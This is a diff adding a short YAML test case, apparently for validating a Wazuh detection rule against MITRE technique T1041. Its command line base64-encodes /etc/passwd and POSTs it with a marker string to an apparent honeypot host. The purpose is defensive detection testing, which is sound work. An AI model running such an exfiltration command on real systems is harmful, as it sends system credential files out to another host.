@@ -1,0 +1,9 @@
+technique: T1041
+description: Send file contents out over the C2 channel with a distinctive marker
+runner: script
+command: |
+  curl -s --max-time 3 -X POST -d "DLL_EXFIL_MARKER=$(base64 -w0 /etc/passwd)" \
+    "http://cowrie:2222/upload" || true
+expect:
+  engine: wazuh
+  rule_id: "100611"
